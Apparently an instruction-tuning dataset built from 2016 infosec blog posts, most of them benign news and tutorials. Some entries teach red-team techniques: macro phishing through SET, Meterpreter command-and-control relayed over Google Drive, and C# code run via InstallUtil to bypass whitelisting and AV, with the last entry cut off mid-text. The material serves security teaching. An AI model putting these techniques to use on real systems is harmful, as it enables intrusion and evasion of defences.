Pwn2Own the Trend Micro's Zero Day Initiative research team has issued a 65 page PDF which details the winning entries in the contest This paper paints a picture of browser technology still full of security holes There are some really great vulnerabilities in here and nice walk-through of the logic of how these things work ocuments.trendmicro.com assets pdf shell-on-earth.pdf In keeping with my recent pattern I decided to add a project I'm looking into This week it's Felony I've had a fair share of people tell me that they don't regularly use crypto because it's difficult Here they're probably referring to the GnuPG command line interface which can be a bit steep if you don't have any understanding of how public key cryptography is meant to function Fortunately there are folks out there who are trying to remedy this situation Felony gives a nice front-end to GnuPG it allows use of the system through the native-ish windowing systems folks are used to That's a good thing ithub.com henryboldi felony"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Are You InfoSec Synced?</title>\n<taxonomies>Author, InfoSec 101, Joff Thyer, business departments, defensive security, infosec, infosec design</taxonomies>\n<creation_date>Mon, 08 Aug 2016 15:22:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer One of my observations over time in the Information Security market is that the vendors seem to want to solve challenges with appliance point solutions It is perfectly understandable that people want a piece of the fiscal pie and makes a healthy living but in today's threat environment this approach is failing Mature organizations are naturally looking for solutions because they know from their metrics and their security operations programs that things are not as healthy as they would like They are tired of solutions that link their security operations people to a firehose of mostly irrelevant data In a lot of cases paying your most talented security analysts more money to keep their eyes glued and focused on log pattern analysis will yield better results than all of the flashy graphics of ten solutions combined In the industry it is beyond time for us to insist on security solutions that cross communicate and form a peer partnership combined strategy In addition it is too easy to get carried away by the glowing silver bullet like solutions and forget our security 101's For example Do you have an inventory of your hardware assets Do you have an inventory of your software assets Are you logging centrally Do you have good change management control and metrics More to the point security threats are evolving quickly beyond the appliance solution space There will not be a single solution that exclusively watches the endpoint and yields the result you are looking for Solutions will have to adapt to a behavior-based approach and be able to take in data from multiple perspectives in a computing environment from the endpoint to the network and to the various perimeters It is high time that organizations start the process of micro-level communications segmentation driven by the rich software based directory structure most environments have and further enabled by interlocking endpoint firewall and network segmentation solutions It is high time for all of our software in a sophisticated computing environment to cooperate closely examine heuristics behaviors and enforce only legitimate communications A great one for XKCD What do I mean As an example what if we have a finance department with Windows 10 deployed desktops This department users office productivity applications print and email In the context of this example security professional interests in properly architecting and designing for error detection and correction should be Enforce communications from the finance systems to needed server resources and print resources Prevent direct peer communications between finance and engineering departments for example Lockdown the application runtime environment It is predictable and controllable in the business context Provide whitelisted Internet web resources that finance can connect to or at minimum enforce categorization of resources through perimeter proxies Upon network connection use network access control software to properly enforce a finance communications profile Employ a belt and suspenders approach by doubling down on the communications enforcement with Windows endpoint firewall configuration Log all event information to a central log source Log any all exceptions that deviate from the deployed communications profile and chase them down in an incident response process In short we all must stop thinking in terms of organizational silos and start the process of architecting designing for proper error detection and error correction response to outliers As a consequence our software and various human resources must work in a cooperative fashion LDAP and or Active Directory must be enabled to drive micro-level network enforcement decisions and link the entire communications profile together from the perspectives of internal network segment to allowed permitted Internet resources and Internet perimeter communications profile Our very survival mandates that we move away from reactive solutions to a proactive design for success and correct failure stance Staying with an exclusive reactive point solution approach will no longer scale and will ensure your personnel remain in a fire fighting mode and will also prevent them from maturing as analysts to deal with the more sophisticated landscape we now face"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Time To Bash on Windows (Bourne Again Shell That Is)</title>\n<taxonomies>How-To, Azure, Bash Commands, Linux, phishing, PowerShell, Social Engineering Toolkit, Windows, Windows10</taxonomies>\n<creation_date>Wed, 10 Aug 2016 15:32:45 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Editor's Note This is another awesome guest post from our friend Robert Schwass If you'd like to guest post contact us here Robert Schwass I had heard the rumors about the Windows Subsystem for Linux WSL and recently I watched a demo video using it for devops to push updates to a Linux-based web server in Azure with a bash shell Has this put a stop to the endless Windows vs Linux debate Most likely not But I don't subscribe and who really cares I was however presented with a solution for the age-old question How can I create PowerShell payloads and push them out with tools that only run on Linux with ease So the research began I decided to drink the Kool-Aid and opt-in to the Windows 10 Insider Program The first step is of course to set up your Windows 10 system for the Insider Preview Program and get bash up and running If you need help with that consult the internet There are many guides to setting the environment up I personally downloaded the latest ISO from Microsoft and did an upgrade install by mounting it inside the OS and running setup.exe From there you simply add the feature to Windows 10 and you're up and running bash Approx 45 Min I have been working with macros extensively lately and have created a PowerShell script PSPayload that will generate macros from PowerShell scripts and even create the Excel file I have always been a huge fan of the Social Engineering Toolkit SET and how easy it is to send out Phishing attacks Although this tool is Python based and does run on Windows the Windows version lacks functionality the Linux version is full featured So my next step was to get SET running within the subsystem environment If you want all the features of SET which I do you also have to install Metasploit Getting Metasploit and all of its dependencies installed took some research but I have provided a list of commands to run here to save anyone interested some headache Mainly the issues were getting a solid copy of Ruby installed Now SET by default allows you to use Metasploit to generate payloads such as PDF's and ZIP files to be sent out in Phishing attacks but I couldn't quite figure out how to use an external file with the SET Framework as is This functionality may exist by default full disclosure I'm a newb I created the feature request on the SET Github nonetheless Until I hear back from the SET devs I made my own work around by copying and modifying the email script SET uses and putting it in SET's root directory The script can be downloaded from here The script utilizes core functionality and modules within the framework so it has to be in the root directory of SET in my case opt set within the bash environment Demo Phase 1 Create the PowerShell Payload aka Macro aka Excel .xls file The payload is a simple 'get-process read-host list processes and pause The .xls file has been created and also a .txt file that contains just the macro Let's examine the .xls file In Excel Developer Tab VBA button Click on the ThisWorkbook item Under VBAProject to view the macro The ThisWorkbook Object will execute the created macro once the document opens The user will have to allow macros but they are easily fooled most of the time The macros generated by PSPayload by default run in the background I will edit the one in this demo by removing the -NoP -NonI -W Hidden so we can see the results later Phase 2 From Bash Send the Email SET has a series of questions it asks I want to keep the file name For this demo I do a single email but you can easily read addresses from a list with Mass Mailer Set the Subject Plain Text or HTML and The Body I used the same Gmail for sender and recipient Set the sender name password and if you want to flag the email as important If everything worked you will see the above Message is in my inbox Inside we see the message body an attachment Download the attachment open it and enable editing and enable content Remember the PowerShell oneliner was a get-process read-host which is what the windows that popped up showed Also remember I intentionally disabled the stealthiness Conclusion So there you have it I used a Linux-based tool to push out a payload I created with PowerShell all on a Windows system This is just the first of what could be some great tool combining utilizing WSL Another cool feature is that you can delete and reinstall the entire bash filesystem and start from scratch with a few commands in the cmd prompt lxrun uninstall full lxrun install PSPayload can take much larger and more complex scripts and put them into macro form I have tested it with multiple line scripts and even payloads generated from the PowerCat module All of that information is available on the Github Caveats WSL is still very very new and it is seriously limited For example it cannot open network sockets and has trouble sending ICMP packets The networking issues limit SET's capabilities to send out it's own payloads and start listeners So this concept currently is not ready for prime time However Microsoft is developing this at a very fast rate and I suspect in the near future they may have the networking bugs fixed I did reach out to TrustedSec on Github and since conducting this research they have added the functionality into SET to use email attachments not generated with SET itself So if you are using the latest version of SET you may not need to use my Email_attachment.py script Metasploit does not run correctly by itself I just needed it to satisfy SET Hopefully in the future Metasploit will be up and running in this environment as well Now I know this will never replace Linux running via boot disk or installed to the PC directly accessing hardware There are many cases when you simply must use Linux such as for wireless network audits This idea is not intended to replace Linux but merely enhance Windows"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 081216</title>\n<taxonomies>InfoSec 101, News, Apple, boot key, bug bounty, Exodus, Microsoft, TCp attack</taxonomies>\n<creation_date>Fri, 12 Aug 2016 15:18:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffmann So Apple announced a new bug bounty program at BlackHat and there are some interesting deviations from the norm in their plan to implement and pay out First of all Apple will be selecting a core group of researchers to be eligible for bounties so no a person cannot simply find a bug in Apple and get a bounty for it Rather your submission of a serious bug may get you considered for the approved group One notable thing about this bounty was that Apple is offering 200 000 for bugs found in its secure boot firmware That's a huge number of dollars and also a rather small target However as many have pointed out about bug bounties and the major operating system manufacturers there are people willing to pay much more for that bug Case and point Exodus Intelligence has announced they'll pay out 500 000 for the same bug The Register has a far more witty rundown if you're interested ww.theregister.co.uk 2016 08 11 exodus_intelligence_500k_bounty It would seem Microsoft has lost control of a key generated specifically to backdoor the secure boot features on many devices The researchers are quoted in the Ars Technica article pointing out to the FBI that this is what happens when there's a back door with a secure golden key Now if OPM can't do any better with your files than to store them as PDFs on unencrypted media how do we expected any branch of the government to keep up with their precious golden key Something tells me this isn't the last time we'll learn this lesson either rstechnica.com security 2016 08 microsoft-secure-boot-firmware-snafu-leaks-golden-key jg59.dreamwidth.org 44223.html There is a new Off path TCP attack described by this paper which could allow an attacker to inject packets into a TCP stream from off path This is difficult because sequence numbers are randomized and typically the attacker must have some way of knowing if the victim hosts are currently communicating and on what port Linux is the only operating system currently suffering from this attack and that is due to the fact that it's the only operating system with a completely and correctly implemented off path attack mitigation system as described in RFC 5961 It is that mitigation system which this attack is exploiting It should be noted that this attack can still be mitigated by tuning sysctl's tcp_challenge_ack_limit to something absurdly large I have been curious for a while about bug bounty programs and their payouts I've seen a few stories of great success where an airline paid out enough free miles for the bounty hunter to see the world or a company spelled their name in the numbers of the paycheck Google and a few horror stories where the bounty client claimed the bug was not a security issue fixed it and stiffed the the bounty hunter All in all it has always seemed like too much work to get into only to find out that an XSS is not in scope and therefore no one will be paying up That makes this article by albinowax an interesting read"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>It's Always Nice to Have Cron-ies!</title>\n<taxonomies>How-To, Linus, n00b, red tape, VPN</taxonomies>\n<creation_date>Tue, 16 Aug 2016 16:25:41 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Rick Wisser I have been asked by some friends not very Linux proficient friends to share this I thought I would create a blog post and share with all We all had to start somewhere and sometimes we forget that not everyone is an avid Linux user Just like I'm not an avid beer maker yet I was hanging out with a couple of my old Admin friends about a month ago and the question of VPN's came up Everyone commented on what VPN they use at work and at home OpenVPN was mentioned as it is a great software solution and found to be rather easy to implement One of them mentioned that they wish they would implement a scheduling solution so that they could limit access during updates and also have the flexibility to allow interns only access during certain hours We all got a good laugh out of that but then realized he was serious This lead to a deep discussion about the companies that everyone works or had worked for and the red tape that seems to run along with them Did I mention that I love BHIS I think that if there was red tape it got handed out at a conference somewhere with one of our awesome T-shirts Keep fighting my friends keep fighting After I got home I thought about the comment of limiting access and the ability to have a schedule in place for the OpenVPN solution For some reason I have this curse which causes my mind to run crazy with small trivial things that I somehow twist into a challenge I believe that my friends do this to me on purpose sometimes because they are just evil like that I have to admit that a lot of the stuff that they come up with is really trivial but sometimes it poses as a challenge far more than just solving a solution in which it could include solutions for other problems Don't ask The next day I decided to look further into the scheduling solution since I have an OpenVPN server installed in my lab at home With a little research on the OpenVPN website I found command line syntax to disable user access as well as suspend their account The following commands were found on the OpenVPN website ocs.openvpn.net docs access-server openvpn-access-server-command-line-tools.html session-management Ban a User Command Line Syntax for OpenVPN Server Disconnect a User Command Line Syntax for OpenVPN Server Now that I know the command line syntax it was time to create a bash script so that it could be called later to disconnect and ban a user Notice there is a nice addition to the disconnect user command which lets you give them a reason for the disconnect In my past life I used to work for a contract manufacture of printed circuit boards which consisted of computer motherboards telephone equipment SCSI controllers medical devices and so on Most of the functional bench testing was done with cron jobs because almost always the first part of the test was to set the time to the default again with a script so that times it took to test could be caught and utilized to determine if there were propagation delay issues especially in CPU and Ram timing Therefore we would run bash scripts to launch various tests at specific points in time This was very affective in finding timing issues with the bus speeds of the devices and seemed to be the easiest way to implement them at that time Now I am sure there are far better ways to do this Creating a bash script is really easy Login via SSH escalate to root sudo su then create a directory to hold your bash scripts Then cd into that directory Root access is needed since it is required to run the OpenVPN scripts medic openvpnas mkdir scripts medic openvpnas cd scripts medic openvpnas scripts Then use VI or Nano to create the name of the bash script e.g vi discbanuser.sh or nano discbanuser.sh This will open a blank file called discbanuser.sh in the current directory medic openvpnas scripts nano discbanuser.sh Then input the information below in order to run the commands you have to be in the scripts directory below This is a different directory than the directory you just created Batch Script to Disconnect and Ban the User Now we have our batch script for disconnecting and banning a user from our OpenVPN lets create another Bash Script to unban or allow them to connect again to the VPN Server This will be created in the same scripts directory as the discbanuser.sh and we will call it unbanuser.sh Bash Script to Allow User to Connect to VPN We now have our bash scripts created therefore it is time to make sure the permissions are correct for these files to be executed Not that it is ls lowercase L medic openvpnas scripts ls l Total 8 -rw-r--r 1 root root 1010 Aug 8 15 30 discbanuser.sh -rw-r--r 1 root root 428 Aug 8 15 33 unbanuser.sh medic openvpnas scripts Note that the files are not allowed to be executed so we need to change that medic openvpnas scripts chmod 755 discbanuser.sh medic openvpnas scripts chmod 755 unbanuser.sh medic openvpnas scripts ls l Total 8 -rwxr-xr-x 1 root root 1010 Aug 8 15 30 discbanuser.sh -rwxr-xr-x 1 root root 428 Aug 8 15 33 unbanuser.sh medic openvpnas scripts Now the bash scripts are executable we can work to schedule them with crontab Crontab or you may have heard of them as Cron Job or Cron Is a scheduler for Linux All Linux users have used them for one task or another as it may be used for scheduling reboots updating and various other tasks There is a short funny read about an individual who created different scripts to automate his most mundane tasks which can be found here hat.thedailywtf.com topic 17997 now-that-s-what-i-call-hacker In fact I am still waiting for BHIS to get us a coffee maker that hooks up to the network Moving on I have an OpenVPN virtual machine running so to schedule a task just type following command medic openvpnas scripts crontab -e This will open up crontab file for the current user which is what the e means The crontab file it gives you information about what syntax to utilize as you can see below Crontab File with Calls to Bash Scripts As you can see by the file I have already placed calls to my discbanuser.sh and unbanuser.sh scripts These tasks will run at 10 00pm and 10 30pm respectively on the first day of the week Now we can save the file and then check to see if it works I logged into the VPN as ricktest a user I created earlier I waited for the message to arrive that I had been disconnected from the server I got the message that I was disconnected as well as the message that I included in the command within the bash script That worked well Now to try and connect to the VPN Server again Just what was expected I then tested again after the script had unbanned the account and I was again able to login Even though this is simple example hopefully it will give those newbies to Linux and my friends a foothold into the world of crontab As you can see the sky is the limit as what scheduled tasks and bash scripting can be used for Make sure you check out the link mentioned previously in this blog for some more fun and advanced examples"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 081916</title>\n<taxonomies>InfoSec 101, News, 4A, Cryptography, Election2016, Gov Hacking, hardware hacking, Microsoft, PowerShell, reverse engineering, Tinfoil Hat, Weird Stuff</taxonomies>\n<creation_date>Fri, 19 Aug 2016 17:35:03 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman So Microsoft is open sourcing PowerShell and putting it on Linux Realistically Linux already has a full suite of administrative tools and some very powerful scripting languages that I feel do anything you'd want to do with PowerShell but faster and safer However it makes me wonder how long it will take the folks over at PowerShell Empire to turn this recent development into a very handy tool for administering other people's Windows systems from the comfort of your nix based machine logs.msdn.microsoft.com powershell 2016 08 18 powershell-on-linux-and-open-source-2 This article is a little older but I'd missed it initially this past week EthanRobish mentioned it to me and having not seen it he sent a link The article itself is a great read and cough puts on tinfoil hat I have always said that with something as important as an election I'd personally be totally surprised if it weren't being hacked at some level This article seems to speak to the validity of that suspicion ww.bloomberg.com features 2016-how-to-hack-an-election Disclaimer Long article that contains assembly language I have posted some articles on hardware hacking before it's something that I'm curious about but unfortunately have never gotten around to This article is fantastic It gives a really great rundown on how the author reasoned through the challenge of reverse engineering some router binaries as well as a finding right at the end which I won't ruin for you log.ioactive.com 2016 08 multiple-vulnerabilities-in-bhu-wifi.html EFF Lets not wait to talk about government sponsored hacking ncardozo and agcrocker wrote a blog post which looks at the fact that we've been given plenty of evidence that the US government has no moral qualms with using technology to push the limits of the fourth amendment well beyond where most Americans would probably draw a line ww.eff.org deeplinks 2016 08 we-shouldnt-wait-another-fifteen-years-conversation-about-government-hacking I like weird things Esoteric things I had a lot of fun probably more than is normal reading through this post I think the first section was my favorite log.bjrn.se 2016 08 cabinet-of-curiosities-bunch-of.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Google Docs becomes Google SOCKS: C2 Over Google Drive</title>\n<taxonomies>C2, Red Team, C2, Google Drive</taxonomies>\n<creation_date>Wed, 24 Aug 2016 16:16:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Luke Baggett If you're monitoring a network with internet access it's almost inevitable that you're going to see a lot of traffic to and from Google servers Blending in with Google traffic by using Google as a relay may help an attacker avoid detection How could an attacker use Google as a relay One way is with the Drive API which allows automation of uploading and downloading of data through Google Drive The API is simple and quick enough to allow for relatively solid communication between two systems SSH Metasploit Meterpreter sessions and more can be relayed through Google's servers using this API I've created a script called google_socks.py as a proof of concept The script starts up a Python socket object and each set of new data from the socket is pushed to drive as a new file of a specific name Each script knows what files to read due to their names The below diagram illustrates how two systems can communicate via this method The client on the left read files named File 2 and creates new files named File 1 The client on the right does the opposite When using this method the two sockets should be able to function as if they were directly connected but with additional latency Just how well does this work Let's look at a few demos Basic Data Transfer and Shell embed outu.be obtjoDRLcRs embed In this video both google_socks.py scripts listen on local ports for Netcat clients The scripts then forward data between their sockets and Google Drive allowing the Netcat clients to communicate The argument -P 0.2 specifies a polling interval of 0.2 seconds -j 0 specifies 0 polling randomization aka jitter and -c 0 tells the script to use the zeroth set of credentials stored in the script Doing these things helps prevent API request rate limiting which happens when one API client sends more than 10 queries per second to the server SSH There is a tradeoff involved with using Google Drive as a relay You get high throughput but high latency as well This becomes more noticeable when using things where small packets need to be sent and received in quick succession like SSH embed outu.be oBCCU9al3Fs embed In the above video there is one instance of google_socks.py listening on the local port 9090 and one instance which connects to a remote SSH server on port 22 The SSH client then connects to local port 9090 and the traffic is forwarded through Google Drive to the remote SSH server Meterpreter embed outu.be dF2DzehDeKo embed Linux Host 192.168.56.1 Windows VM 192.168.56.101 Kali VM 192.168.56.102 In this demo Meterpreter communicates with a multi-handler via Google Drive The Kali VM produces a Meterpreter payload which connects to the Linux Host at 192.168.56.1 port 9090 The Linux host listens on 192.168.56.1 port 9090 then forwards the data to Google Drive Another google_socks.py script relays data from Drive to the mutli handler on the Kali VM at 192.168.56.102 port 9090 The payload is executed on the Windows VM and the Meterpreter session opens It takes a moment for things to load fully so that meterpreter accepts commands which is why the process list command fails initially The screenshot command is run and it works perfectly Want to try this out yourself You can download the PoC script here on my github You'll need to run --setup which will explain how to set up API access for yourself Here are some good resources on the python client library oogle.github.io google-api-python-client docs epy googleapiclient-module.html evelopers.google.com resources api-libraries documentation drive v3 python latest index.html evelopers.google.com resources api-libraries documentation drive v2 python latest index.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Reminders - Simple Security and Finding Sanity In the Digital Age</title>\n<taxonomies>Author, InfoSec 201, Jordan Drysdale, apricorn, bash history, evading content filters with SSH, exif-tool, histcontrol, peach jam, personal google maintenance, photo scrubbing, pickles, yubico, yubikey</taxonomies>\n<creation_date>Mon, 29 Aug 2016 14:59:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale As I wander through life in what now seems like a world gone entirely mad disconnecting from digital is my newest hobby Information overload constantly smashes us in the face at every turn I try to maintain overload data in a collection of bookmarks mental notes recurring nightmares scrawl and Post-It notes on my cubical wall Without further ado here are a few favorites Post-It notes and personal disconnects from the annals of a sysadmin For those who live and work inside a shell did you know that you can paste strings into a shell easily with CTRL SHIFT v Another paste trick that had Lawrence thanking me infinitely after he spent the last couple years manually entering our brutal 25 character randomized strings into VMs you can paste directly into a virtual machine using VMWare Workstation Yes we know you can integrate your VMs with tools to make everything less secure Yeah so...select the field in the VM you want to paste in to ALT CTRL to escape the mouse capture copy your string and navigate to Edit Paste in Workstation Did you remember that you can hide from bash history by tagging the spacebar in front of your commands Yup by default the HISTCONTROL variable is set to 'ignorespace and can be modified to also 'ignoredups or 'ignoreboth Link for reference and picture proof try it Change can be difficult but the boss just asked If I gave you an extra hundred bucks a day that's change too right So how do I change the tone of this blog from semi-technical randomness and the ignorespace variable to my garden Like in life it usually happens when I executed something idiotic in a shell a co-worker might see Regardless of how we make the transition the garden and green space are one of my favorite places to hide from my phone and the travails of Internet life Cucumbers are as easy as anything to grow place seeds in dirt add water Pickles are one of my all time favorite foods Grow cucumbers garlic and dill Buy jars and salt Set up your canning rig Profit Mmmmmmm .pickles It hasn't been so long since the article about cleansing your history from the omnipotent overlords of the information age but it seems like an eternity Since well yeah....I just had to cleanse location data and maps and location data personal searches et cetera again My search history is littered with recipe requests odd facts historical trivia movie quotes YouTube TM requests and command strings Frightening what they maintain caution toothy link Quiet reminder...if you aren't paying money for it you're not the customer In the spare time I create in life I also love making jams jellies and salsa Disconnect digital device check Baste peaches and peel check Boil sugar peaches and pectin check Fire up the water bath fill jars rock and roll Boom Since we are talking about hiding covering our tracks and so forth don't forget to scrub your picture files of meta data before uploading them to the Internet For Linux the exif-tool is rad Also this blog_post is an amazing guide for how to hide on the Internet Digressed again...Anyway I borrowed this for loop wandering about the Internet so credit is due to someone somewhere pwd some pic dir for i in .jpg do echo Processing i exiftool -all i done for i in .png do echo Processing i exiftool -all i done You want to shrink those pictures too Go grab imagemagick Linux and do something like this for file in .png do convert file -quality 60 shrunk file done 60 here represents a percentage quality reference for file in .jpg do convert file -quality 60 shrunk file done Ref ww.howtogeek.com 109369 how-to-quickly-resize-convert-modify-images-from-the-linux-terminal Socks proxies are fun too and depending on where you are in the world and if you are restricted you might still be able to evade filters Two commands the first to create a localhost socket and the second to launch chrome with a socks proxy ssh -D 3333 -f -C -q -N -p 2222 evader 12.34.56.78 assumes ssh is listening on 2222 at 12.34.56.78 google-chrome --proxy-server socks localhost 3333 In your browser visit icanhazip.com and you should see the text string of 12.34.56.78 Let's remember to secure all the things These folks make our favorite external drives in the whole known universe Apricorn apricorn_info They just released a new Secure USB 3 with the following awesomeness in quotes Data written to the drive is encrypted on the fly using military-grade full-disk AES 256-bit XTS hardware encryption It's also FIPS 140-2 Level 3 validated and is designed to Inspector Gadget self-destruct in response to brute force attempts Trust me if your organization takes 'data in transit security seriously something in this_product_matrix can solve those problems for the foreseeable future If you haven't heard of Yubico or seen their products take a look They produce a series of USB token products that can be used for strengthening authentication across a multitude of services Docker Github Google Apps Password Databases your SSH systems They are quickly gaining traction and this is a solution I would love to see in more businesses Oh yeah and for paranoia enthusiasts these are manufactured in the US and Sweden Article summary review Yubikey is awesome for protecting super sensitive things and password files...like KeePass LastPass Apricorn apricorn_info literally makes one of the most secure external drives on the market today Cleanse and shrink your pictures before posting them and find a hobby like photography gardening something Clean up your google history too Last don't forget to disconnect once in awhile"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Powershell Without Powershell - How To Bypass Application Whitelisting, Environment Restrictions & AV</title>\n<taxonomies>Author, Beau Bullock, Brian Fehrman, Red Team, Red Team Tools, how to bypass Anti Virus, How to bypass AV, How to bypass whitelisting, PowerShell, PowerShell without PowerShell, What to do when PowerShell is banned</taxonomies>\n<creation_date>Wed, 31 Aug 2016 15:08:26 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman With shout outs to Kelsey Bellew Beau Bullock In a previous blog post we talked about bypassing AV and Application Whitelisting by using a method developed by Casey Smith In a recent engagement we ran into an environment with even more restrictions in place Not only did they have AV and Application Whitelisting but they were also blocking the use of PowerShell and cmd.exe We have run into a few instances where this was the case More and more companies are realizing that normal users don't need access to cmd.exe PowerShell or other cool tools We feel that these are excellent steps to take in securing an environment Defenders must realize however that there are potential ways around these restrictions If you've ever watched our Sacred Cash Cow tipping series you've likely seen the method that I developed for executing the Invoke-Shellcode.ps1 file from within a C program Essentially you turn the Invoke-Shellcode.ps1 file into one long single-line and embed it as a string variable within the C program The result is a stand-alone executable that spawns a meterpreter shell and bypasses most AV products Teaser Alert the full walkthrough for that will come in a future video blog-post So what does that have to do with this blog post Well we can extend that concept to allow us to execute any PowerShell script within an environment that doesn't otherwise allow for PowerShell execution How does it work The magic is in the fact that both C and PowerShell are effectively just frontends for the .NET framework We are taking advantage of the fact that we can use C executables to directly call the same .NET functionality that is accessed by PowerShell If you wanted to you could just write C programs to do whatever your PowerShell scripts do...but why go through all that work when you already have the PowerShell scripts Enough talk let's do this Create a new blank text-file on your Windows Desktop and name it Program.cs You can call it whatever you want...but that's just a suggestion Open it up in an editor such as NotePad First we need to import some functionality by adding the following using statements to the top of the file using System using System.Configuration.Install using System.Runtime.InteropServices using System.Management.Automation.Runspaces In order for our program to compile properly we need to define a class that contains a method named Main Typically this would be the main entry point into our program We will call our class the same name as our Program.cs file Add the following lines to the end of your Program.cs file public class Program public static void Main The next step is to define the true entry point for our program We will be using the InstallUtil.exe utility to run our program rather than executing it directly This is the wizardry that can allow us to bypass application-whitelisting restrictions In order to do this we define a class named Sample that inherits from the Installer class We then declare a method named Uninstall which will be the true entry point to our program In this case the first task our program will perform will be to call a method named Exec that is part of a class named Mycode We also add a statement above the class declaration to say that this method is expected to be run as part of an installation process Add the following lines to the bottom of your Program.cs file System.ComponentModel.RunInstaller true public class Sample System.Configuration.Install.Installer public override void Uninstall System.Collections.IDictionary savedState Mycode.Exec The final piece to our program is to define the Mycode class and a method named Exec The method reads in a PowerShell script that is located at the path that is defined in the notation In this case my PowerShell script is located at C Users fmc Desktop PowerUp.ps1 The lines that follow this are used to set up variables and parameters that are needed in order to execute the PowerShell script Finally the PowerShell script is executed with the pipeline.Invoke call Add the following lines to the end of your Program.cs file public class Mycode public static void Exec string command System.IO.File.ReadAllText C Users fmc Desktop PowerUp.ps1 RunspaceConfiguration rspacecfg RunspaceConfiguration.Create Runspace rspace RunspaceFactory.CreateRunspace rspacecfg rspace.Open Pipeline pipeline rspace.CreatePipeline pipeline.Commands.AddScript command pipeline.Invoke The entire Program.cs file should look as follows using System using System.Configuration.Install using System.Runtime.InteropServices using System.Management.Automation.Runspaces public class Program public static void Main System.ComponentModel.RunInstaller true public class Sample System.Configuration.Install.Installer public override void Uninstall System.Collections.IDictionary savedState Mycode.Exec public class Mycode public static void Exec string command System.IO.File.ReadAllText C Users fmc Desktop PowerUp.ps1 RunspaceConfiguration rspacecfg RunspaceConfiguration.Create Runspace rspace RunspaceFactory.CreateRunspace rspacecfg rspace.Open Pipeline pipeline rspace.CreatePipeline pipeline.Commands.AddScript command pipeline.Invoke In this example I am using Veil-Framework's PowerUp script Previously you'd run the script from within a PowerShell prompt and output the results to a file by doing something like the following Import-Module PowerUp.ps1 Invoke-AllChecks -Verbose Out-File C Users fmc Desktop allchecks.txt In order for the function to be called with this method we need to add an explicit function call to the end of the script Open up the PowerUp.ps1 script and add the function call to the very bottom of the file Make sure to name your Out-File parameter to suit your environment Save the script and exit Invoke-AllChecks -Verbose Out-File C Users fmc Desktop allchecks.txt Now we need to compile our program We are going to use the csc.exe utility to perform the compilation We have to 